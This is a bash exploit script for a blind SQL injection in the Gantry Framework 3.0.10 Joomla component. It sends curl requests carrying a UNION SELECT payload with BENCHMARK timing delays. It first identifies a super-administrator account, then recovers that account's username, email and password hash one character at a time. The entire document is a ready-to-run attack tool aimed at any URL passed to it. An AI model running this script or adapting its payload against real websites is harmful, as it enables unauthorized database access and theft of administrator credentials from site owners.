#!/bin/bash
# Exploit Title: Gantry Framework 3.0.10 (Joomla) Blind SQL Injection 
Exploit
# Date: 4 September 2010
# Author: jdc
# Software Link: http://www.gantry-framework.org
# Version: 3.0.10
# Patched: 3.0.11
if [ "$1" == "" ]
then
     echo "$0 usage: $0 url [debug]"
     echo ""
     exit 1
fi
clear
echo "##############################################################"
echo "##   Gantry Framework 3.0.10 Blind SQL Injection Exploit    ##"
echo "##############################################################"
echo ""
echo "   Probing target $1 ..."
echo ""
GANTRY_PATH="$1/index.php"
GANTRY_TIMEOUT="5"
GANTRY_DELAY="10"
GANTRY_AGENT='Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'
GANTRY_DATA="option=com_gantry&tmpl=gantry-ajax&model=module&moduleid="
GANTRY_BENCHMARK="10000000"
GANTRY_ADMIN_ID=""
GANTRY_OUTPUT=""
GANTRY_EXPLOIT="-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16"
GANTRY_TEST=`curl -s -A "$GANTRY_AGENT" -d "$GANTRY_DATA$GANTRY_EXPLOIT" 
"$GANTRY_PATH"`
GANTRY_REQUESTS="1"
if [ "Direct access not allowed." != "$GANTRY_TEST" ]
then
     echo $GANTRY_TEST
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo "!! Site not vulnerable. Bailing! !!"
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo ""
     echo "$GANTRY_REQUESTS requests"
     echo ""
     exit 1
fi
echo -n "   Trying to get a super admin id... "
for N in `seq 62 9999`
do
    
  GANTRY_EXPLOIT="-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,IF((SELECT%20id%20FROM%20%23__users%20WHERE%20gid=25%20AND%20id=$N),BENCHMARK($GANTRY_BENCHMARK,MD5(1)),16)"
     GANTRY_TIME="`curl -s -A "$GANTRY_AGENT" -o /dev/null -w 
'%{time_total}' -H 'X-Requested-With: XMLHttpRequest' -d 
"$GANTRY_DATA$GANTRY_EXPLOIT" $GANTRY_PATH`"
     GANTRY_REQUESTS=`echo "$GANTRY_REQUESTS + 1" | bc`
     if [ "" != "$2" ]
     then
         printf "$N"
         echo "  $GANTRY_TIME"
     fi
     if [ `echo "$GANTRY_TIME > $GANTRY_TIMEOUT" | bc` == 1 ]
     then
         GANTRY_ADMIN_ID="$N"
         break
     fi
     sleep $GANTRY_DELAY
done
if [ "" == $GANTRY_ADMIN_ID ]
then
     echo "FAILED!"
     echo ""
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo "!!       Injection FAILED!       !!"
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo ""
     echo "$GANTRY_REQUESTS requests"
     echo ""
     exit 1
fi
echo $GANTRY_ADMIN_ID
echo "   Fetching admin info (this WILL take a while)... "
echo ""
echo -n " > "
for I in `seq 1 250`
do
     GANTRY_LENGTH=`echo "$GANTRY_OUTPUT" | wc -c`
     GANTRY_CONTINUE=0
     #a,d,m,i,n,b-c,e-h,j-l,o-z,A-Z,0-9,special chars
     for J in `seq 97 97;seq 100 100;seq 109 109;seq 105 105;seq 110 
110;seq 98 99;seq 101 104;seq 106 108;seq 111 122;seq 65 90;seq 48 
57;seq 32 47;seq 58 64;seq 91 96;seq 123 126`
     do
         if [ 1 == $GANTRY_CONTINUE ]
         then
             continue
         fi
         sleep $GANTRY_DELAY
        
  GANTRY_EXPLOIT="-1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,IF((SELECT%20id%20FROM%20%23__users%20WHERE%20gid=25%20AND%20id=$GANTRY_ADMIN_ID%20AND%20ASCII(SUBSTRING(CONCAT(username,0x3a,email,0x3a,password),$I,1))=$J),BENCHMARK(10000000,MD5(1)),16)"
         GANTRY_TIME="`curl -s -A "$GANTRY_AGENT" -o /dev/null -w 
'%{time_total}' -H 'X-Requested-With: XMLHttpRequest' -d 
"$GANTRY_DATA$GANTRY_EXPLOIT" $GANTRY_PATH`"
         GANTRY_REQUESTS=`echo "$GANTRY_REQUESTS + 1" | bc`
         if [ "" != "$2" ]
         then
             printf "\x$(printf %x $J)"
             echo "  $GANTRY_TIME"
         fi
         if [ `echo "$GANTRY_TIME > $GANTRY_TIMEOUT" | bc` == 1 ]
         then
             LETTER=`printf "\x$(printf %x $J)"`
             GANTRY_OUTPUT="$GANTRY_OUTPUT$LETTER"
             GANTRY_CONTINUE=1
             if [ "" == "$2" ]
             then
                 echo -n "$LETTER"
             fi
         fi
     done
     GANTRY_LENGTH2=`echo "$GANTRY_OUTPUT" | wc -c`
     if [ "$GANTRY_LENGTH" == "$GANTRY_LENGTH2" ]
     then
         break
     fi
done
echo ""
if [ "$GANTRY_OUTPUT" == "" ]
then
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo "!!       Injection FAILED!       !!"
     echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
     echo ""
     echo "$GANTRY_REQUESTS requests"
     echo ""
     exit 1
fi
echo ""
echo "$GANTRY_OUTPUT"
echo ""
echo "$GANTRY_REQUESTS requests"
echo ""
exit 0
